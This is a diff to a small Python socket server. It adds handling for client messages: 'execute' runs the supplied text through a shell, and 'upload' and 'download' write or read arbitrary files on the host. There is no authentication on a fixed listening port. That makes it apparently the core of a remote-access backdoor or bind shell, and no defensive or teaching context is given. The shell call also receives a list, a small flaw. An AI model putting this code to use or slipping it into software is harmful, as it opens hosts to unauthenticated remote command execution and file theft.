@@ -8,7 +8,6 @@ import subprocess
 HEADERSIZE = 10
 PORT = 64209
 
-
 ### Execute ###
 def Execute(command):
     subprocess.Popen(command, shell=True)
@@ -30,7 +29,6 @@ def Download(fileName):
     localFile.close()
     return OutputText
 
-
 # Main code
 def main():
     # Start Socket stream
@@ -47,6 +45,22 @@ def main():
         messageForClient = f'{len(messageForClient):<{HEADERSIZE}}' + messageForClient
         clientsocket.send(bytes(messageForClient, "UTF-8"))
         
+        # Receive message from client
+        msg = clientsocket.recv(1024)
+        msg = msg.decode("utf-8")
+        
+        # Parse the command from the client
+        command = msg.split()[0]
+        if command == "execute":
+            command = msg.split()[1:]
+            Execute(command)
+        elif command == "upload":
+            b64String = msg.split()[1]
+            outputFile = msg.split()[2]
+            Upload(b64String, outputFile)
+        elif command == "download":
+            fileName = msg.split()[1]
+            Download(fileName)
 
 if __name__ == '__main__':
     main()
